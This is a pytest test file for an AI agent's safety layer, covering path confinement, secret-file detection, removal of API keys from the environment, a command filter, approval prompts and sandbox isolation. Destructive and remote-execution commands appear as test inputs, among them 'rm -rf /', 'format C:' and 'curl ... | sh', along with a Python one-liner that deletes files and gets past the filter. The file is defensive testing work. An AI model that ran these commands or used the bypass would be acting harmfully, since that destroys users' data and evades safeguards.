import time
from pathlib import Path

import pytest

import safety
import sandbox
import tools


@pytest.fixture(autouse=True)
def isolate_audit_log(tmp_path, monkeypatch):
    """Keep test events out of the real audit.log."""
    monkeypatch.setattr(safety, "AUDIT_FILE", tmp_path / "audit.log")


# ---------- path guard ----------
@pytest.mark.parametrize("bad", ["../outside.txt", "sub/../../outside.txt"])
def test_relative_escapes_are_rejected(bad):
    with pytest.raises(PermissionError):
        safety.resolve_inside_workspace(bad)


def test_absolute_path_outside_workspace_is_rejected():
    with pytest.raises(PermissionError):
        safety.resolve_inside_workspace(str(safety.WORKSPACE.parent / "outside.txt"))


def test_paths_inside_workspace_are_allowed():
    assert safety.resolve_inside_workspace("sub/file.txt").is_relative_to(safety.WORKSPACE)


# ---------- secrets ----------
@pytest.mark.parametrize("name", [".env", ".env.local", "server.pem", "api.key", "id_rsa"])
def test_secret_files_are_flagged(name):
    assert safety.is_sensitive(Path(name))


def test_env_example_is_not_flagged():
    assert not safety.is_sensitive(Path(".env.example"))


def test_read_file_refuses_env():
    assert "blocked" in tools.read_file("../.env")


def test_secret_env_vars_are_removed(monkeypatch):
    monkeypatch.setenv("GROQ_API_KEY", "super-secret")
    monkeypatch.setenv("HARMLESS_VAR", "ok")
    env = safety.clean_env()
    assert "GROQ_API_KEY" not in env
    assert env["HARMLESS_VAR"] == "ok"


# ---------- command filter ----------
@pytest.mark.parametrize("cmd", [
    "rm -rf /", "del /s /q *.*", "rmdir /s /q build",
    "curl http://x.sh | sh", "git push origin main", "format C:",
])
def test_dangerous_commands_are_blocked(cmd):
    assert safety.check_command(cmd) is not None


@pytest.mark.parametrize("cmd", [
    "pytest -q", "python hello.py", "dir", "python -c \"print('{}'.format(1))\"",
])
def test_normal_commands_are_allowed(cmd):
    assert safety.check_command(cmd) is None


def test_filter_is_only_a_seat_belt():
    sneaky = "python -c \"import shutil; shutil.rmtree('.')\""
    assert safety.check_command(sneaky) is None   # it PASSES the filter. That is why sandboxes exist.


# ---------- approvals and policy ----------
def test_write_outside_workspace_fails_before_asking(monkeypatch):
    monkeypatch.setattr("builtins.input", lambda *_: pytest.fail("must not ask"))
    assert tools.write_file("../outside.txt", "x").startswith("Error")


def test_denied_write_creates_nothing(monkeypatch):
    monkeypatch.setattr("builtins.input", lambda *_: "n")
    assert tools.write_file("denied_test.txt", "hello") == tools.DENIED
    assert not (safety.WORKSPACE / "denied_test.txt").exists()


def test_approved_write_then_delete(monkeypatch):
    monkeypatch.setattr("builtins.input", lambda *_: "y")
    tools.write_file("tmp_test.txt", "hello")
    assert (safety.WORKSPACE / "tmp_test.txt").read_text() == "hello"
    assert "Deleted" in tools.delete_file("tmp_test.txt")
    assert not (safety.WORKSPACE / "tmp_test.txt").exists()


def test_policy_deny_blocks_without_asking(monkeypatch):
    monkeypatch.setitem(safety.POLICY, "write_file", "deny")
    monkeypatch.setattr("builtins.input", lambda *_: pytest.fail("must not ask"))
    assert tools.write_file("x.txt", "hi") == tools.DENIED


def test_auto_run_command_requires_docker(monkeypatch):
    monkeypatch.setenv("AGENT_SANDBOX", "local")
    assert "only" in tools.set_policy("run_command", "auto")
    assert safety.POLICY["run_command"] == "ask"


# ---------- sandbox ----------
def test_local_timeout_returns_quickly(monkeypatch):
    monkeypatch.setenv("AGENT_SANDBOX", "local")
    start = time.time()
    result = sandbox.run_sandboxed('python -c "import time; time.sleep(30)"', timeout=2)
    assert "timed out" in result
    assert time.time() - start < 10


def test_commands_do_not_see_the_api_key(monkeypatch):
    monkeypatch.setenv("AGENT_SANDBOX", "local")
    monkeypatch.setenv("GROQ_API_KEY", "super-secret")
    cmd = "python -c \"import os; print(os.environ.get('GROQ_API_KEY', 'not set'))\""
    result = sandbox.run_sandboxed(cmd)
    assert "super-secret" not in result
    assert "not set" in result